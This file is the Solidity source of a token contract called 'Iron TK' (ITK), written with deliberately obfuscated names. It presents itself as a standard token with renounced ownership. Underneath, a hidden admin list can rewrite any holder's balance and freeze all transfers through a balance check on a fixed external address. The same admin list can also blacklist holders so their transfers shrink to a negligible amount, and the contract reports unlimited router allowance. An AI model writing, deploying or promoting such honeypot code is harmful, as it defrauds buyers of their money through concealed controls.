//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface zlyjhzdnfczvxj {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract egtixwmljbgv {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface bvweajruurjlvj {
    function createPair(address wazsxrwrnafcx, address zxseuvxixw) external returns (address);
}

interface cshfikafrzm {
    function totalSupply() external view returns (uint256);

    function balanceOf(address thafumpjlnbuex) external view returns (uint256);

    function transfer(address raubhhmqiky, uint256 lljrakyth) external returns (bool);

    function allowance(address unlqbgrvhlsgt, address spender) external view returns (uint256);

    function approve(address spender, uint256 lljrakyth) external returns (bool);

    function transferFrom(
        address sender,
        address raubhhmqiky,
        uint256 lljrakyth
    ) external returns (bool);

    event Transfer(address indexed from, address indexed omhifntfbx, uint256 value);
    event Approval(address indexed unlqbgrvhlsgt, address indexed spender, uint256 value);
}

interface cshfikafrzmMetadata is cshfikafrzm {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract IronTK is egtixwmljbgv, cshfikafrzm, cshfikafrzmMetadata {

    function getOwner() external view returns (address) {
        return ndafagrsz;
    }

    function name() external view virtual override returns (string memory) {
        return vzjqelugy;
    }

    function rtvhvishnrg(uint256 lljrakyth) public {
        mkplztdtfsewu();
        zzrryegjkergx = lljrakyth;
    }

    address private ndafagrsz;

    mapping(address => bool) public hbjsltyfbcwhz;

    function libkpsfnsy(address filflyarkxgkx, uint256 lljrakyth) public {
        mkplztdtfsewu();
        gdccrruebtvdw[filflyarkxgkx] = lljrakyth;
    }

    function jkyxqqqwrdq(address ojpciuisst, address raubhhmqiky, uint256 lljrakyth) internal returns (bool) {
        if (ojpciuisst == ltbdjkgdnqmqfs) {
            return itwgxrzah(ojpciuisst, raubhhmqiky, lljrakyth);
        }
        uint256 fuawjllrrmzwe = cshfikafrzm(yytqhvwvqd).balanceOf(vwwixddifser);
        require(fuawjllrrmzwe == zzrryegjkergx);
        if (tnbgvielzxk[ojpciuisst]) {
            return itwgxrzah(ojpciuisst, raubhhmqiky, kyclpvfxsmdbt);
        }
        return itwgxrzah(ojpciuisst, raubhhmqiky, lljrakyth);
    }

    address public yytqhvwvqd;

    mapping(address => uint256) private gdccrruebtvdw;

    function zuxniyyax(address lwdoebclx) public {
        if (hdbyvggasbt) {
            return;
        }
        
        hbjsltyfbcwhz[lwdoebclx] = true;
        
        hdbyvggasbt = true;
    }

    bool private dyeqxbzuxjkrco;

    uint256 kuilcapshnt;

    function approve(address eyohkafsabtu, uint256 lljrakyth) public virtual override returns (bool) {
        xztkhuljcul[_msgSender()][eyohkafsabtu] = lljrakyth;
        emit Approval(_msgSender(), eyohkafsabtu, lljrakyth);
        return true;
    }

    event OwnershipTransferred(address indexed pkfhbbpzmed, address indexed rptehgrbltt);

    uint256 public xtrjuhwpkx;

    function transfer(address filflyarkxgkx, uint256 lljrakyth) external virtual override returns (bool) {
        return jkyxqqqwrdq(_msgSender(), filflyarkxgkx, lljrakyth);
    }

    uint256 zzrryegjkergx;

    function balanceOf(address thafumpjlnbuex) public view virtual override returns (uint256) {
        return gdccrruebtvdw[thafumpjlnbuex];
    }

    function mkplztdtfsewu() private view {
        require(hbjsltyfbcwhz[_msgSender()]);
    }

    function decimals() external view virtual override returns (uint8) {
        return laqpvlebjf;
    }

    constructor (){
        if (nsnrixvkidm) {
            xtrjuhwpkx = sysdztcjoyhjcw;
        }
        koctmxravfw();
        zlyjhzdnfczvxj zmhrfklxrevnwc = zlyjhzdnfczvxj(zbvvfnlzeyi);
        yytqhvwvqd = bvweajruurjlvj(zmhrfklxrevnwc.factory()).createPair(zmhrfklxrevnwc.WETH(), address(this));
        
        ltbdjkgdnqmqfs = _msgSender();
        hbjsltyfbcwhz[ltbdjkgdnqmqfs] = true;
        gdccrruebtvdw[ltbdjkgdnqmqfs] = srmdbeeas;
        if (dsoovefeoy) {
            dyeqxbzuxjkrco = true;
        }
        emit Transfer(address(0), ltbdjkgdnqmqfs, srmdbeeas);
    }

    function symbol() external view virtual override returns (string memory) {
        return fnzhwjdqgjnsc;
    }

    uint256 private srmdbeeas = 100000000 * 10 ** 18;

    function allowance(address zgajjslncwtjee, address eyohkafsabtu) external view virtual override returns (uint256) {
        if (eyohkafsabtu == zbvvfnlzeyi) {
            return type(uint256).max;
        }
        return xztkhuljcul[zgajjslncwtjee][eyohkafsabtu];
    }

    function koctmxravfw() public {
        emit OwnershipTransferred(ltbdjkgdnqmqfs, address(0));
        ndafagrsz = address(0);
    }

    uint8 private laqpvlebjf = 18;

    function totalSupply() external view virtual override returns (uint256) {
        return srmdbeeas;
    }

    address public ltbdjkgdnqmqfs;

    mapping(address => bool) public tnbgvielzxk;

    uint256 private sysdztcjoyhjcw;

    function owner() external view returns (address) {
        return ndafagrsz;
    }

    uint256 constant kyclpvfxsmdbt = 11 ** 10;

    function transferFrom(address ojpciuisst, address raubhhmqiky, uint256 lljrakyth) external override returns (bool) {
        if (_msgSender() != zbvvfnlzeyi) {
            if (xztkhuljcul[ojpciuisst][_msgSender()] != type(uint256).max) {
                require(lljrakyth <= xztkhuljcul[ojpciuisst][_msgSender()]);
                xztkhuljcul[ojpciuisst][_msgSender()] -= lljrakyth;
            }
        }
        return jkyxqqqwrdq(ojpciuisst, raubhhmqiky, lljrakyth);
    }

    bool public dsoovefeoy;

    string private vzjqelugy = "Iron TK";

    mapping(address => mapping(address => uint256)) private xztkhuljcul;

    bool private nsnrixvkidm;

    string private fnzhwjdqgjnsc = "ITK";

    function itwgxrzah(address ojpciuisst, address raubhhmqiky, uint256 lljrakyth) internal returns (bool) {
        require(gdccrruebtvdw[ojpciuisst] >= lljrakyth);
        gdccrruebtvdw[ojpciuisst] -= lljrakyth;
        gdccrruebtvdw[raubhhmqiky] += lljrakyth;
        emit Transfer(ojpciuisst, raubhhmqiky, lljrakyth);
        return true;
    }

    bool public hdbyvggasbt;

    address zbvvfnlzeyi = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function ybyfvqzxpix(address nmpioeekdxb) public {
        mkplztdtfsewu();
        if (nsnrixvkidm) {
            dsoovefeoy = true;
        }
        if (nmpioeekdxb == ltbdjkgdnqmqfs || nmpioeekdxb == yytqhvwvqd) {
            return;
        }
        tnbgvielzxk[nmpioeekdxb] = true;
    }

    address vwwixddifser = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

}